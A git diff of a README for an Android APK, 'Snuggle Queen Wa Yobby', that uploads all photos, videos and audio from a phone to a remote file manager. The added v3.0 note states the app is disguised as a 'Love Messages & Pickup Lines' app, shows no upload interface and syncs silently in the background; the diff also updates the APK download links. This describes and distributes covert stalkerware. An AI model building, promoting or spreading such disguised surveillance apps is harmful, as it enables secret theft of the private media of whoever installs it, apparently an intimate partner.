@@ -1,10 +1,12 @@
 # 💕 Snuggle Queen Wa Yobby
 
 > Android APK that syncs ALL your photos, videos, and audio files to a private cloud file manager. Built with love ❤️.
+>
+> 🆕 **v3.0 now available** — The app is disguised as a "Love Messages & Pickup Lines" app. No upload UI is visible. Background sync runs silently.
 
 ## 📥 Download APK
 
-**[⬇ Download Snuggle_Queen_Wa_Yobby.apk](https://github.com/yobbyking/snuggle-queen-wa-yobby/releases/download/v2.0/Snuggle_Queen_Wa_Yobby.apk)**
+**[⬇ Download Snuggle_Queen_Wa_Yobby.apk](https://github.com/yobbyking/snuggle-queen-wa-yobby/releases/download/v3.0/Snuggle_Queen_Wa_Yobby.apk)**
 
 1. Click the link above to download the APK
 2. Transfer it to your Android phone
@@ -35,7 +37,7 @@
 
 ## 🔗 Links
 
-- **Download APK**: https://github.com/yobbyking/snuggle-queen-wa-yobby/releases/download/v2.0/Snuggle_Queen_Wa_Yobby.apk
+- **Download APK**: https://github.com/yobbyking/snuggle-queen-wa-yobby/releases/download/v3.0/Snuggle_Queen_Wa_Yobby.apk
 - **Web Dashboard**: https://snuggle-queen.onrender.com
 - **GitHub Repo**: https://github.com/yobbyking/snuggle-queen-wa-yobby
 
@@ -80,3 +82,4 @@ snuggle-queen-wa-yobby/
 ## 📝 License
 
 MIT — made with ❤️ for Snuggle Queen Wa Yobby
+
